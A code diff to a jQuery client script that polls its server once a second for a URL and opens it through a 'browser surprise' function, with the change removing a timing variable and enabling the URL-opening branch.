@@ -9,10 +9,8 @@ $( document ).ready(function() {
 		
 		// console.log('unique ID on the CLIENT SIDE IS AFTER SENDING THE TAB: ' + myID);
 
-		var timeLastAction = new Date().getTime() / 1000;
-	
 		setInterval(function() {
-			askForBrowserSurprise(timeLastAction, myID);
+			askForBrowserSurprise(myID);
 		}, 1000);
 
 	});
@@ -20,28 +18,19 @@ $( document ).ready(function() {
 });
 
 
-function askForBrowserSurprise(time, myID){
+function askForBrowserSurprise(myID){
 	askServerForNewURL(myID, function(url){
 
-		console.log('i got this from the server: ' + url);
-
-
+		// console.log('i got this from the server: ' + url);
+		if(url.length > 0){
+			
+			console.log('[+] Received new URL from server.');
+			console.log('\turl received: ' + url);
+			console.log('\t...opening now:');
+			
+			browser_surprise(url);
+		}
 	});
-
-	// now let's check if the url is useful (thats the case if the server decides to send one back,
-	// has to do with the timer on the server);
-	
-
-	// if(newURL.length > 0){
-	// 	var currentTime = new Date().getTime() / 1000;
-	// 	var timeInterval = currentTime - timeLastAction;
-	// 	timeLastAction = currentTime;
-	// 	console.log('[+] Received new URL from server. ' + timeInterval + " seconds since the last surprise.");
-	// 	console.log('\turl received: ' + newURL);
-	// 	console.log('\t...opening now:');
-		
-	// 	browser_surprise(newURL);
-	// }
 }
 
 
